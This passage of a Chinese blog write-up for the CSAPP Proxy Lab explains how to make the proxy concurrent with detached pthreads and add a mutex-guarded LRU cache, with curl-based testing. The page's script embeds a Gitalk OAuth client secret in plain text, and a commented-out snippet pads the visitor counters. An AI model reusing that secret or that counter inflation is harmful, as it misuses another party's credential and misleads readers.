+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> value[MAXLINE];</span><br><span class="line">&#125;http_headers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> requestType[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> Protocol[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> address[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> resource[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> port[<span class="number">10</span>];</span><br><span class="line">&#125;http_target;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="2-Part-B-3">2) Part B</h3>
+<ul>
+<li>
+<p>Part B中的任务只有一个，将程序修改为并发程序。</p>
+</li>
+<li>
+<p>最简单的实现方式就是使用pthread来进行多线程处理。需要注意的是，每一条线程都必须使用<strong>分离模式</strong>，这样当某条线程结束任务后，其资源就可以自动被操作系统释放，而无需主线程主动释放，避免了内存泄露。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pthread_attr_t</span> thread_attr;</span><br><span class="line"><span class="keyword">pthread_t</span> thread;</span><br><span class="line"><span class="comment">// 设置线程状态为分离状态，防止大量线程结束后没有被回收，所导致的内存泄露</span></span><br><span class="line">pthread_attr_init(&amp;thread_attr);</span><br><span class="line">pthread_attr_setdetachstate(&amp;thread_attr, PTHREAD_CREATE_DETACHED);</span><br><span class="line"><span class="comment">// 初始化线程锁</span></span><br><span class="line">pthread_mutex_init(&amp;thread_mutex, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 线程执行doit(connfd);</span></span><br><span class="line">pthread_create(&amp;thread, &amp;thread_attr, doit, (<span class="keyword">void</span>*)(<span class="keyword">long</span>)connfd);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Part B分值15分。</p>
+</li>
+</ul>
+<h3 id="3-Part-C-2">3) Part C</h3>
+<ul>
+<li>
+<p>Part C要求我们对Proxy程序添加缓存功能，即当代理服务本身存放着某个资源的缓存时，代理服务就可以之间将该资源返回给客户端，而不需要向服务器申请。</p>
+</li>
+<li>
+<p>使用LRU作为Cache的置换算法，单次读取某个资源时需要重新设置该资源的LRU变量。故其数据结构定义如下</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 缓存</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> address[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> content_type[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">size_t</span> lru;</span><br><span class="line">&#125;cache_line;</span><br><span class="line"><span class="keyword">size_t</span> current_lru = <span class="number">1</span>, cache_nums = <span class="number">0</span>, cache_size = <span class="number">0</span>;</span><br><span class="line">cache_line cache[MAX_CACHE_LINE];</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>由于写入数据会修改Cache，读取数据也会修改Cache，故每条线程在使用Cache时必须对资源上锁，防止条件竞争。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 互斥锁</span></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> thread_mutex;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">doit</span><span class="params">(<span class="keyword">void</span>* thread_arg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 设置线程锁</span></span><br><span class="line">  pthread_mutex_lock(&amp;thread_mutex);</span><br><span class="line">  <span class="comment">// 判断该资源是否存在cache中</span></span><br><span class="line">  <span class="keyword">const</span> cache_line* tmpCache = readCache(uri);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 解锁</span></span><br><span class="line">  pthread_mutex_unlock(&amp;thread_mutex);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Part C分值也是15分。</p>
+</li>
+</ul>
+<h3 id="4-测试">4) 测试</h3>
+<ul>
+<li>调试时，可以使用<code>curl -v &lt;webAddr&gt; --proxy &lt;proxyAddr&gt;</code>命令来调试，使用<code>-v</code>参数可以时curl输出发送的http内容与返回的http内容，便于调试。<br>
+<img src="/2020/07/csapp-lab-writeup/proxy_curl.png" alt="img"></li>
+<li>最终代码存放于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/8.%20Proxy%20Lab/proxy.c" target="_blank" rel="noopener">github</a><br>
+最后的评分如下<br>
+<img src="/2020/07/csapp-lab-writeup/proxy_grade.png" alt="img"></li>
+</ul>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/07/csapp-lab-writeup/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSAPP/" rel="tag">CSAPP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" rel="tag">计算机基础</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/07/csapp/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            CSAPP笔记
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/07/AFL-LLVM-Mode/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">AFL的LLVM_Mode</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
